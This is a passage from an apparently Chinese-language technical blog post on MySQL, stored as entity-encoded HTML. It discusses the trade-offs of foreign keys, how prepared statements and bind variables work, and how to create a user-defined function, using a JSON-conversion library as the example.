title="&#x5916;&#x952E;&#x7EA6;&#x675F;"></a>&#x5916;&#x952E;&#x7EA6;&#x675F;</h4><p>&#x76EE;&#x524D;&#x5728;&#x5927;&#x591A;&#x6570;&#x4E92;&#x8054;&#x7F51;&#x9879;&#x76EE;&#xFF0C;&#x7279;&#x522B;&#x662F;&#x5728;&#x5927;&#x6570;&#x636E;&#x7684;&#x573A;&#x666F;&#x4E0B;&#xFF0C;&#x5DF2;&#x7ECF;&#x4E0D;&#x5EFA;&#x8BAE;&#x4F7F;&#x7528;&#x5916;&#x952E;&#x4E86;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x8003;&#x8651;&#x5230;&#x5916;&#x952E;&#x7684;&#x4F7F;&#x7528;&#x6210;&#x672C;&#xFF1A;</p><ul><li>&#x5916;&#x952E;&#x901A;&#x5E38;&#x8981;&#x6C42;&#x6BCF;&#x6B21;&#x4FEE;&#x6539;&#x6570;&#x636E;&#x65F6;&#x90FD;&#x8981;&#x5728;&#x53E6;&#x5916;&#x4E00;&#x5F20;&#x8868;&#x4E2D;&#x6267;&#x884C;&#x4E00;&#x6B21;&#x67E5;&#x627E;&#x64CD;&#x4F5C;&#x3002;&#x5728; InnoDB &#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x4E2D;&#x4F1A;&#x5F3A;&#x5236;&#x5916;&#x952E;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#xFF0C;&#x4F46;&#x5728;&#x5927;&#x6570;&#x636E;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4ECD;&#x7136;&#x4E0D;&#x80FD;&#x5FFD;&#x7565;&#x5916;&#x952E;&#x68C0;&#x67E5;&#x5E26;&#x6765;&#x7684;&#x5F00;&#x9500;&#xFF0C;&#x7279;&#x522B;&#x662F;&#x5F53;&#x5916;&#x952E;&#x7684;&#x9009;&#x62E9;&#x6027;&#x5F88;&#x4F4E;&#x65F6;&#xFF0C;&#x4F1A;&#x5BFC;&#x81F4;&#x4E00;&#x4E2A;&#x975E;&#x5E38;&#x5927;&#x4E14;&#x9009;&#x62E9;&#x6027;&#x4F4E;&#x7684;&#x7D22;&#x5F15;&#x3002;</li><li>&#x5982;&#x679C;&#x5411;&#x5B50;&#x8868;&#x4E2D;&#x63D2;&#x5165;&#x4E00;&#x6761;&#x8BB0;&#x5F55;&#xFF0C;&#x5916;&#x952E;&#x7EA6;&#x675F;&#x4F1A;&#x8BA9; InnoDB &#x68C0;&#x67E5;&#x5BF9;&#x5E94;&#x7684;&#x7236;&#x8868;&#x7684;&#x8BB0;&#x5F55;&#xFF0C;&#x4E5F;&#x5C31;&#x9700;&#x8981;&#x5BF9;&#x7236;&#x8868;&#x5BF9;&#x5E94;&#x8BB0;&#x5F55;&#x8FDB;&#x884C;&#x52A0;&#x9501;&#x64CD;&#x4F5C;&#xFF0C;&#x6765;&#x786E;&#x4FDD;&#x8FD9;&#x6761;&#x8BB0;&#x5F55;&#x4E0D;&#x4F1A;&#x5728;&#x8FD9;&#x4E2A;&#x4E8B;&#x52A1;&#x5B8C;&#x6210;&#x4E4B;&#x65F6;&#x5C31;&#x88AB;&#x5220;&#x9664;&#x4E86;&#x3002;&#x8FD9;&#x4F1A;&#x5BFC;&#x81F4;&#x989D;&#x5916;&#x7684;&#x9501;&#x7B49;&#x5F85;&#xFF0C;&#x751A;&#x81F3;&#x4F1A;&#x5BFC;&#x81F4;&#x4E00;&#x4E9B;&#x6B7B;&#x9501;&#x3002;</li><li>&#x9AD8;&#x5E76;&#x53D1;&#x573A;&#x666F;&#x4E0B;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x5F88;&#x5BB9;&#x6613;&#x6210;&#x4E3A;&#x6027;&#x80FD;&#x74F6;&#x9888;&#xFF0C;&#x81EA;&#x7136;&#x800C;&#x7136;&#x7684;&#x5C31;&#x5E0C;&#x671B;&#x6570;&#x636E;&#x5E93;&#x53EF;&#x4EE5;&#x6C34;&#x5E73;&#x6269;&#x5C55;&#xFF0C;&#x8FD9;&#x65F6;&#x5C31;&#x9700;&#x8981;&#x628A;&#x6570;&#x636E;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x63A7;&#x5236;&#x653E;&#x5230;&#x5E94;&#x7528;&#x5C42;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BA9;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x5668;&#x53EF;&#x4EE5;&#x627F;&#x62C5;&#x538B;&#x529B;&#xFF0C;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x5C42;&#x9762;&#x5C31;&#x4E0D;&#x80FD;&#x4F7F;&#x7528;&#x5916;&#x952E;&#x3002;</li></ul><p>&#x56E0;&#x6B64;&#xFF0C;&#x5F53;&#x4E0D;&#x7528;&#x8FC7;&#x591A;&#x8003;&#x8651;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6027;&#x80FD;&#x95EE;&#x9898;&#x65F6;&#xFF0C;&#x6BD4;&#x5982;&#x4E00;&#x4E9B;&#x5185;&#x90E8;&#x9879;&#x76EE;&#x6216;&#x4F20;&#x7EDF;&#x884C;&#x4E1A;&#x9879;&#x76EE;&#xFF08;&#x5176;&#x4F7F;&#x7528;&#x4EBA;&#x6570;&#x6709;&#x9650;&#xFF0C;&#x800C;&#x4E14;&#x6570;&#x636E;&#x91CF;&#x4E00;&#x822C;&#x4E0D;&#x4F1A;&#x592A;&#x5927;&#xFF09;&#xFF0C;&#x4F7F;&#x7528;&#x5916;&#x952E;&#x662F;&#x4E00;&#x4E2A;&#x4E0D;&#x9519;&#x7684;&#x9009;&#x62E9;&#xFF0C;&#x6BD5;&#x7ADF;&#x60F3;&#x8981;&#x786E;&#x4FDD;&#x76F8;&#x5173;&#x8868;&#x59CB;&#x7EC8;&#x6709;&#x4E00;&#x81F4;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x4F7F;&#x7528;&#x5916;&#x952E;&#x8981;&#x6BD4;&#x5728;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4E2D;&#x68C0;&#x67E5;&#x4E00;&#x81F4;&#x6027;&#x65B9;&#x4FBF;&#x7B80;&#x5355;&#x8BB8;&#x591A;&#xFF0C;&#x6B64;&#x5916;&#xFF0C;&#x5916;&#x952E;&#x5728;&#x76F8;&#x5173;&#x6570;&#x636E;&#x7684;&#x5220;&#x9664;&#x548C;&#x66F4;&#x65B0;&#x64CD;&#x4F5C;&#x4E0A;&#x4E5F;&#x4F1A;&#x6BD4;&#x5728;&#x5E94;&#x7528;&#x4E2D;&#x8981;&#x9AD8;&#x6548;&#x3002;</p><h4 id="&#x7ED1;&#x5B9A;&#x53D8;&#x91CF;"><a href="#&#x7ED1;&#x5B9A;&#x53D8;&#x91CF;" class="headerlink" title="&#x7ED1;&#x5B9A;&#x53D8;&#x91CF;"></a>&#x7ED1;&#x5B9A;&#x53D8;&#x91CF;</h4><p>&#x53EF;&#x80FD;&#x5927;&#x5BB6;&#x770B;&#x5230; &#x201C;&#x7ED1;&#x5B9A;&#x53D8;&#x91CF;&#x201D; &#x8FD9;&#x4E2A;&#x8BCD;&#x65F6;&#xFF0C;&#x4F1A;&#x6709;&#x4E00;&#x70B9;&#x964C;&#x751F;&#xFF0C;&#x6362;&#x4E2A;&#x8BF4;&#x6CD5;&#x53EF;&#x80FD;&#x4F1A;&#x719F;&#x6089;&#x4E00;&#x4E9B;&#xFF1A;prepared statement&#x3002;&#x7ED1;&#x5B9A;&#x53D8;&#x91CF;&#x7684; SQL&#xFF0C;&#x4F7F;&#x7528;&#x95EE;&#x53F7;&#x6807;&#x8BB0;&#x53EF;&#x4EE5;&#x63A5;&#x6536;&#x53C2;&#x6570;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x5F53;&#x771F;&#x6B63;&#x9700;&#x8981;&#x6267;&#x884C;&#x5177;&#x4F53;&#x67E5;&#x8BE2;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5219;&#x4F7F;&#x7528;&#x5177;&#x4F53;&#x7684;&#x6570;&#x503C;&#x4EE3;&#x66FF;&#x8FD9;&#x4E9B;&#x95EE;&#x53F7;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SELECT order_no, order_amount FROM sales WHERE order_status = ? and buyer = ?</span><br><span class="line">```    </span><br><span class="line"></span><br><span class="line">&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x4F7F;&#x7528;&#x7ED1;&#x5B9A;&#x53D8;&#x91CF;&#xFF1F;&#x603B;&#x6240;&#x5468;&#x77E5;&#x7684;&#x539F;&#x56E0;&#x662F;&#x53EF;&#x4EE5;&#x9884;&#x5148;&#x7F16;&#x8BD1;&#xFF0C;&#x51CF;&#x5C11; SQL &#x6CE8;&#x5165;&#x7684;&#x98CE;&#x9669;&#xFF0C;&#x9664;&#x4E86;&#x8FD9;&#x4E9B;&#x5462;&#xFF1F;</span><br><span class="line"></span><br><span class="line">&#x5F53;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7ED1;&#x5B9A;&#x53D8;&#x91CF; SQL &#x65F6;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x5411;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x4E86;&#x4E00;&#x4E2A; SQL &#x8BED;&#x53E5;&#x539F;&#x578B;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x6536;&#x5230;&#x8FD9;&#x4E2A; SQL &#x8BED;&#x53E5;&#x7684;&#x6846;&#x67B6;&#x540E;&#xFF0C;&#x89E3;&#x6790;&#x5E76;&#x5B58;&#x50A8;&#x8FD9;&#x4E2A; SQL &#x8BED;&#x53E5;&#x7684;&#x90E8;&#x5206;&#x6267;&#x884C;&#x8BA1;&#x5212;&#xFF0C;&#x8FD4;&#x56DE;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x4E00;&#x4E2A; SQL &#x8BED;&#x53E5;&#x5904;&#x7406;&#x53E5;&#x67C4;&#xFF0C;&#x4ECE;&#x6B64;&#x4EE5;&#x540E;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x901A;&#x8FC7;&#x5411;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x5404;&#x4E2A;&#x95EE;&#x53F7;&#x7684;&#x53D6;&#x503C;&#x548C;&#x8FD9;&#x4E2A;&#x53E5;&#x67C4;&#x6765;&#x6267;&#x884C;&#x4E00;&#x4E2A;&#x5177;&#x4F53;&#x67E5;&#x8BE2;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x53EF;&#x4EE5;&#x66F4;&#x9AD8;&#x6548;&#x5730;&#x6267;&#x884C;&#x5927;&#x91CF;&#x91CD;&#x590D;&#x8BED;&#x53E5;&#xFF0C;&#x56E0;&#x4E3A;&#xFF1A;</span><br><span class="line">* &#x670D;&#x52A1;&#x5668;&#x53EA;&#x9700;&#x8981;&#x89E3;&#x6790;&#x4E00;&#x6B21; SQL &#x8BED;&#x53E5;</span><br><span class="line">* &#x670D;&#x52A1;&#x5668;&#x67D0;&#x4E9B;&#x4F18;&#x5316;&#x5668;&#x7684;&#x4F18;&#x5316;&#x5DE5;&#x4F5C;&#x4E5F;&#x53EA;&#x9700;&#x8981;&#x505A;&#x4E00;&#x6B21;&#xFF0C;&#x56E0;&#x4E3A; MySQL &#x4F1A;&#x7F13;&#x5B58;&#x90E8;&#x5206;&#x6267;&#x884C;&#x8BA1;&#x5212;</span><br><span class="line">* &#x901A;&#x4FE1;&#x4E2D;&#x4EC5;&#x4EC5;&#x53D1;&#x9001;&#x7684;&#x662F;&#x53C2;&#x6570;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x6574;&#x4E2A;&#x8BED;&#x53E5;&#xFF0C;&#x7F51;&#x7EDC;&#x5F00;&#x9500;&#x4E5F;&#x4F1A;&#x66F4;&#x5C0F;&#xFF0C;&#x800C;&#x4E14;&#x4EE5;&#x4E8C;&#x8FDB;&#x5236;&#x53D1;&#x9001;&#x53C2;&#x6570;&#x548C;&#x53E5;&#x67C4;&#x8981;&#x6BD4;&#x53D1;&#x9001; ASCII &#x6587;&#x672C;&#x7684;&#x6548;&#x7387;&#x66F4;&#x9AD8;</span><br><span class="line"></span><br><span class="line">&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;MySQL &#x5E76;&#x4E0D;&#x662F;&#x603B;&#x80FD;&#x7F13;&#x5B58;&#x6267;&#x884C;&#x8BA1;&#x5212;&#xFF0C;&#x5982;&#x679C;&#x67D0;&#x4E9B;&#x6267;&#x884C;&#x8BA1;&#x5212;&#x9700;&#x8981;&#x6839;&#x636E;&#x53C2;&#x5165;&#x7684;&#x53C2;&#x6570;&#x6765;&#x8BA1;&#x7B97;&#x65F6;&#xFF0C;MySQL &#x5C31;&#x65E0;&#x6CD5;&#x7F13;&#x5B58;&#x8FD9;&#x90E8;&#x5206;&#x6267;&#x884C;&#x8BA1;&#x5212;&#x3002;&#x6BD4;&#x5982;&#xFF1A;</span><br><span class="line">```bash</span><br><span class="line">-- &#x8FD9;&#x91CC;&#x5047;&#x88C5;&#x6709;&#x4E00;&#x4E2A;&#x4F8B;&#x5B50;&#xFF0C;&#x5927;&#x5BB6;&#x53EF;&#x4EE5;&#x81EA;&#x5DF1;&#x601D;&#x8003;&#x4E00;&#x4E0B;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F7F;&#x7528;&#x7ED1;&#x5B9A;&#x53D8;&#x91CF;&#x7684;&#x6700;&#x5927;&#x9677;&#x9631;&#x662F;&#xFF1A;&#x4F60;&#x77E5;&#x9053;&#x5176;&#x539F;&#x7406;&#xFF0C;&#x4F46;&#x4E0D;&#x77E5;&#x9053;&#x5B83;&#x662F;&#x5982;&#x4F55;&#x5B9E;&#x73B0;&#x7684;&#x3002;&#x6709;&#x65F6;&#x5019;&#xFF0C;&#x5F88;&#x96BE;&#x89E3;&#x91CA;&#x5982;&#x4E0B; 3 &#x79CD;&#x7ED1;&#x5B9A;&#x53D8;&#x91CF;&#x7C7B;&#x578B;&#x4E4B;&#x95F4;&#x7684;&#x533A;&#x522B;&#xFF1A;</p><ol><li>&#x5BA2;&#x6237;&#x7AEF;&#x6A21;&#x62DF;&#x7684;&#x7ED1;&#x5B9A;&#x53D8;&#x91CF;&#xFF1A;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x9A71;&#x52A8;&#x7A0B;&#x5E8F;&#x63A5;&#x6536;&#x4E00;&#x4E2A;&#x5E26;&#x53C2;&#x6570;&#x7684; SQL&#xFF0C;&#x518D;&#x5C06;&#x53C2;&#x6570;&#x7684;&#x503C;&#x5E26;&#x5165;&#x5176;&#x4E2D;&#xFF0C;&#x6700;&#x540E;&#x5C06;&#x5B8C;&#x6574;&#x7684;&#x67E5;&#x8BE2;&#x53D1;&#x9001;&#x5230;&#x670D;&#x52A1;&#x5668;&#x3002;</li><li>&#x670D;&#x52A1;&#x5668;&#x7ED1;&#x5B9A;&#x53D8;&#x91CF;&#xFF1A;&#x5BA2;&#x6237;&#x7AEF;&#x4F7F;&#x7528;&#x7279;&#x6B8A;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x534F;&#x8BAE;&#x5C06;&#x5E26;&#x53C2;&#x6570;&#x7684; SQL &#x8BED;&#x53E5;&#x53D1;&#x9001;&#x5230;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#xFF0C;&#x7136;&#x540E;&#x4F7F;&#x7528;&#x4E8C;&#x8FDB;&#x5236;&#x534F;&#x8BAE;&#x5C06;&#x5177;&#x4F53;&#x7684;&#x53C2;&#x6570;&#x503C;&#x53D1;&#x9001;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#x5E76;&#x6267;&#x884C;&#x3002;</li><li>SQL &#x63A5;&#x53E3;&#x7684;&#x7ED1;&#x5B9A;&#x53D8;&#x91CF;&#xFF1A;&#x5BA2;&#x6237;&#x7AEF;&#x5148;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x5E26;&#x53C2;&#x6570;&#x7684; SQL &#x8BED;&#x53E5;&#x5230;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#xFF0C;&#x8FD9;&#x7C7B;&#x4F3C;&#x4E8E;&#x4F7F;&#x7528;prepared&#x7684; SQL &#x8BED;&#x53E5;&#xFF0C;&#x7136;&#x540E;&#x53D1;&#x9001;&#x8BBE;&#x7F6E;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x6700;&#x540E;&#x5728;&#x53D1;&#x9001;execute&#x6307;&#x4EE4;&#x6765;&#x6267;&#x884C; SQL&#xFF0C;&#x6240;&#x6709;&#x8FD9;&#x4E9B;&#x90FD;&#x662F;&#x7528;&#x666E;&#x901A;&#x7684;&#x6587;&#x672C;&#x4F20;&#x8F93;&#x534F;&#x8BAE;&#x3002;</li></ol><p>&#x6BD4;&#x5982;&#x67D0;&#x4E9B;&#x4E0D;&#x652F;&#x6301;&#x9884;&#x7F16;&#x8BD1;&#x7684; JDBC &#x9A71;&#x52A8;&#xFF0C;&#x5728;&#x8C03;&#x7528;<code>connection.prepareStatement(sql)</code>&#x65F6;&#xFF0C;&#x5E76;&#x4E0D;&#x4F1A;&#x628A; <code>SQL</code> &#x8BED;&#x53E5;&#x53D1;&#x9001;&#x7ED9;&#x6570;&#x636E;&#x5E93;&#x505A;&#x9884;&#x5904;&#x7406;&#xFF0C;&#x800C;&#x662F;&#x7B49;&#x5230;&#x8C03;&#x7528;<code>executeQuery</code>&#x65B9;&#x6CD5;&#x65F6;&#x624D;&#x628A;&#x6574;&#x4E2A;&#x8BED;&#x53E5;&#x53D1;&#x9001;&#x5230;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x5C31;&#x7C7B;&#x4F3C;&#x4E8E;&#x7B2C; 1 &#x79CD;&#x60C5;&#x51B5;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x5728;&#x7A0B;&#x5E8F;&#x4E2D;&#x4F7F;&#x7528;&#x7ED1;&#x5B9A;&#x53D8;&#x91CF;&#x65F6;&#xFF0C;&#x7406;&#x89E3;&#x4F60;&#x4F7F;&#x7528;&#x7684;&#x9A71;&#x52A8;&#x901A;&#x8FC7;&#x54EA;&#x79CD;&#x65B9;&#x5F0F;&#x6765;&#x5B9E;&#x73B0;&#x5C31;&#x663E;&#x5F97;&#x5F88;&#x6709;&#x5FC5;&#x8981;&#x3002;&#x5EF6;&#x4F38;&#x5F00;&#x6765;&#x8BF4;&#xFF0C;&#x5BF9;&#x4E8E;&#x81EA;&#x5DF1;&#x4F7F;&#x7528;&#x7684;&#x6846;&#x67B6;&#x3001;&#x5F00;&#x6E90;&#x5DE5;&#x5177;&#xFF0C;&#x4E0D;&#x5E94;&#x4EC5;&#x4EC5;&#x505C;&#x7559;&#x5728;&#x4F1A;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x5C42;&#x9762;&#xFF0C;&#x6709;&#x65F6;&#x95F4;&#x53EF;&#x4EE5;&#x6DF1;&#x5165;&#x4E86;&#x89E3;&#x5176;&#x539F;&#x7406;&#x548C;&#x5B9E;&#x73B0;&#xFF0C;&#x4E0D;&#x7136;&#x6709;&#x53EF;&#x80FD;&#x88AB;&#x9A97;&#x4E86;&#x90FD;&#x4E0D;&#x77E5;&#x9053;&#x54E6;&#x3002;</p><h4 id="&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;"><a href="#&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;" class="headerlink" title="&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;"></a>&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;</h4><p>MySQL &#x672C;&#x8EAB;&#x5185;&#x7F6E;&#x4E86;&#x975E;&#x5E38;&#x591A;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x6BD4;&#x5982;SUM&#x3001;COUNT&#x3001;AVG&#x7B49;&#x7B49;&#xFF0C;&#x53EF;&#x5B9E;&#x9645;&#x5E94;&#x7528;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x5E38;&#x5E38;&#x9700;&#x8981;&#x66F4;&#x591A;&#x3002;&#x5927;&#x591A;&#x6570;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x66F4;&#x5F3A;&#x5927;&#x7684;&#x529F;&#x80FD;&#x90FD;&#x662F;&#x5728;&#x5E94;&#x7528;&#x5C42;&#x9762;&#x5B9E;&#x73B0;&#xFF0C;&#x4F46;&#x5B9E;&#x9645;&#x4E0A; MySQL &#x4E5F;&#x63D0;&#x4F9B;&#x4E86;&#x673A;&#x4F1A;&#x8BA9;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53BB;&#x6269;&#x5C55; MySQL &#x51FD;&#x6570;&#xFF0C;&#x8FD9;&#x5C31;&#x662F;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570; (user-defined function)&#xFF0C;&#x4E5F;&#x79F0;&#x4E3A;&#xFF1A;UDF&#x3002;&#x9700;&#x8981;&#x6CE8;&#x610F;UDF&#x4E0E;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x548C;&#x901A;&#x8FC7; SQL &#x521B;&#x5EFA;&#x51FD;&#x6570;&#x7684;&#x533A;&#x522B;&#xFF0C;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x53EA;&#x80FD;&#x4F7F;&#x7528; SQL &#x6765;&#x7F16;&#x5199;&#xFF0C;&#x800C;UDF&#x6CA1;&#x6709;&#x8FD9;&#x4E2A;&#x9650;&#x5236;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x652F;&#x6301; C &#x8BED;&#x8A00;&#x8C03;&#x7528;&#x7EA6;&#x5B9A;&#x7684;&#x4EFB;&#x4F55;&#x7F16;&#x7A0B;&#x8BED;&#x8A00;&#x6765;&#x5B9E;&#x73B0;&#x3002;</p><p>UDF&#x5FC5;&#x987B;&#x4E8B;&#x5148;&#x7F16;&#x8BD1;&#x597D;&#x5E76;&#x52A8;&#x6001;&#x94FE;&#x63A5;&#x5230;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;&#x8FD9;&#x79CD;&#x5E73;&#x53F0;&#x76F8;&#x5173;&#x6027;&#x4F7F;&#x5F97;UDF&#x5728;&#x5F88;&#x591A;&#x65B9;&#x9762;&#x90FD;&#x5F88;&#x5F3A;&#x5927;&#xFF0C;UDF&#x901F;&#x5EA6;&#x975E;&#x5E38;&#x5FEB;&#xFF0C;&#x800C;&#x4E14;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x5927;&#x91CF;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x529F;&#x80FD;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5927;&#x91CF;&#x5E93;&#x51FD;&#x6570;&#x3002;&#x5982;&#x679C;&#x9700;&#x8981;&#x4E00;&#x4E2A; MySQL &#x4E0D;&#x652F;&#x6301;&#x7684;&#x7EDF;&#x8BA1;&#x805A;&#x5408;&#x51FD;&#x6570;&#xFF0C;&#x5E76;&#x4E14;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x6765;&#x5B9E;&#x73B0;&#xFF0C;&#x800C;&#x4E14;&#x8FD8;&#x60F3;&#x4E0D;&#x540C;&#x7684;&#x8BED;&#x8A00;&#x90FD;&#x53EF;&#x4EE5;&#x8C03;&#x7528;&#xFF0C;&#x90A3;&#x4E48;UDF&#x662F;&#x4E0D;&#x9519;&#x7684;&#x9009;&#x62E9;&#xFF0C;&#x81F3;&#x5C11;&#x4E0D;&#x9700;&#x8981;&#x6BCF;&#x79CD;&#x8BED;&#x8A00;&#x90FD;&#x6765;&#x5B9E;&#x73B0;&#x76F8;&#x540C;&#x7684;&#x903B;&#x8F91;&#x3002;</p><p>&#x6240;&#x8C13;&#x80FD;&#x529B;&#x8D8A;&#x5927;&#xFF0C;&#x8D23;&#x4EFB;&#x4E5F;&#x5C31;&#x8D8A;&#x5927;&#xFF0C;UDF&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x9519;&#x8BEF;&#x53EF;&#x80FD;&#x76F4;&#x63A5;&#x8BA9;&#x670D;&#x52A1;&#x5668;&#x5D29;&#x6E83;&#xFF0C;&#x751A;&#x81F3;&#x6270;&#x4E71;&#x670D;&#x52A1;&#x5668;&#x7684;&#x5185;&#x5B58;&#x548C;&#x6570;&#x636E;&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;&#x4F7F;&#x7528;&#x65F6;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x5176;&#x6F5C;&#x5728;&#x7684;&#x98CE;&#x9669;&#x3002;&#x5728; MySQL &#x7248;&#x672C;&#x5347;&#x7EA7;&#x65F6;&#x4E5F;&#x9700;&#x8981;&#x6CE8;&#x610F;&#xFF0C;&#x56E0;&#x4E3A;&#x4F60;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x91CD;&#x65B0;&#x7F16;&#x8BD1;&#x6216;&#x8005;&#x4FEE;&#x6539;&#x8FD9;&#x4E9B;UDF&#xFF0C;&#x4EE5;&#x4FBF;&#x8BA9;&#x5B83;&#x4EEC;&#x80FD;&#x5728;&#x65B0;&#x7248;&#x672C;&#x4E2D;&#x5DE5;&#x4F5C;&#x3002;</p><p>&#x8FD9;&#x91CC;&#x6709;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x793A;&#x4F8B;&#x6765;&#x5C55;&#x793A;&#x5982;&#x4F55;&#x521B;&#x5EFA;UDF&#xFF1A;&#x5C06;&#x7ED3;&#x679C;&#x96C6;&#x8F6C;&#x5316;&#x4E3A; JSON&#xFF0C;&#x5177;&#x4F53;&#x7684;&#x4EE3;&#x7801;&#x8BF7;&#x53C2;&#x8003;&#xFF1A;lib_mysqludf_json&#x3002;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">-- 1&#x3001;&#x9996;&#x5148;&#x4F7F;&#x7528;c&#x8BED;&#x8A00;&#x5B9E;&#x73B0;&#x529F;&#x80FD;</span><br><span class="line">-- 2&#x3001;&#x7F16;&#x8BD1;</span><br><span class="line">-- &#x8FD9;&#x91CC;&#x7701;&#x7565;&#x7B2C;1&#x3001;2&#x6B65;&#xFF0C;&#x5B9E;&#x73B0;&#x5E76;&#x7F16;&#x8BD1;&#x6210;.so</span><br><span class="line">-- 3&#x3001;&#x4F7F;&#x7528;SQL&#x521B;&#x5EFA;&#x51FD;&#x6570;</span><br><span class="line">DROP FUNCTION json_array;</span><br><span class="line">CREATE FUNCTION json_array RETURNS string soname <span class="string">&apos;lib_mysqludf_json.so&apos;</span>;</span><br><span class="line">-- 4&#x3001;&#x4F7F;&#x7528;&#x51FD;&#x6570;</span><br><span class="line">SELECT</span><br><span class="line">  json_array(</span><br><span class="line">    customer_id,</span><br><span class="line">    first_name,</span><br><span class="line">    last_name,</span><br><span class="line">    last_update</span><br><span class="line">  ) as customer</span><br><span class="line">FROM</span><br><span class="line">  customer</span><br><span class="line">WHERE</span><br><span class="line">  customer_id = 1;</span><br><span class="line">/*</span><br><span class="line">5&#x3001;&#x5F97;&#x5230;&#x7684;&#x7ED3;&#x679C;&#x5982;&#x4E0B;&#xFF1A;</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| customer                                 |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| [1,<span class="string">&quot;MARY&quot;</span>,<span class="string">&quot;SMITH&quot;</span>,<span class="string">&quot;2006-02-15 04:57:20&quot;</span>] |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">*/</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5176;&#x5927;&#x81F4;&#x7684;&#x5B9E;&#x73B0;&#x6D41;&#x7A0B;&#xFF1A;&#x4F7F;&#x7528; C &#x8BED;&#x8A00;&#x5B9E;&#x73B0;&#x903B;&#x8F91; -&gt; &#x7F16;&#x8BD1;&#x6210;.so&#x6587;&#x4EF6; -&gt; &#x521B;&#x5EFA;&#x51FD;&#x6570; -&gt; 